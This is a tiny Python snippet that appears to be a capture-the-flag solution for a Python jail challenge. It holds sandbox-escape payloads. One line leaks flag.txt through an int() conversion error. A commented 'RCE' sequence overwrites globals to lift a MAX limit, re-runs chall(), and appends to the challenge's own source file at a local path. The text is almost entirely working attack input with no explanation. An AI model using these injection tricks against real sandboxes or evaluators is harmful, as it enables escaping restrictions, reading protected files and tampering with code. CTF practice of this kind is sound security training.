int(*open('flag.txt'))
# or RCE with
'''
global a;a=globals();chall()
a.update(MAX=9999);chall()
open('/Users/nil/Documents/Level-3/jails/py/noname/dist/chall.py', 'a').write('a')
'''